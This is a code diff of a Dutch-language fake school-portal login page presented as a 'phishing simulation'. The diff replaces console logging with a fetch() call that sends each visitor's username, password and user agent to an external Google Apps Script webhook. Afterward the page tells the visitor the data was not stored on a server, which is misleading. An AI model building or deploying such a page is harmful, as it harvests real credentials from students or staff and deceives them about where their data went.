@@ -9,7 +9,7 @@
   </style>
 </head>
 <body>
-  <h2>Login bij Mijn Portaal</h2>
+  <h2>Login bij Schoolportaal</h2>
   <form id="loginForm">
     <input type="text" id="username" placeholder="Gebruikersnaam" required><br>
     <input type="password" id="password" placeholder="Wachtwoord" required><br>
@@ -18,19 +18,29 @@
 
   <div id="result" style="display:none; margin-top: 20px;">
     <h3 style="color:red;">⚠️ Phishing Simulatie ⚠️</h3>
-    <p>Je gegevens zijn niet echt opgeslagen.<br>Dit is een educatieve test om bewustzijn te creëren over online veiligheid.</p>
+    <p>Je gegevens zijn niet echt opgeslagen op een server.<br>Dit was een test om je bewust te maken van online phishing.</p>
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      document.getElementById('loginForm').style.display = 'none';
-      document.getElementById('result').style.display = 'block';
+    const webhookURL = "https://script.google.com/macros/s/AKfycbzHHDjulEcUAHwGyj2b87IdQttDnK_nbW-a8sdgRuGOcgAHvYm09RPDkQyPghcDA91D/exec"; // <-- plak jouw Apps Script URL hier
 
-      // Optioneel: console loggen voor demo
-      console.log("Gebruikersnaam:", document.getElementById('username').value);
-      console.log("Wachtwoord:", document.getElementById('password').value);
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const userAgent = navigator.userAgent;
+
+      fetch(webhookURL, {
+        method: "POST",
+        body: JSON.stringify({ username, password, userAgent }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("result").style.display = "block";
     });
   </script>
 </body>
 </html>
+
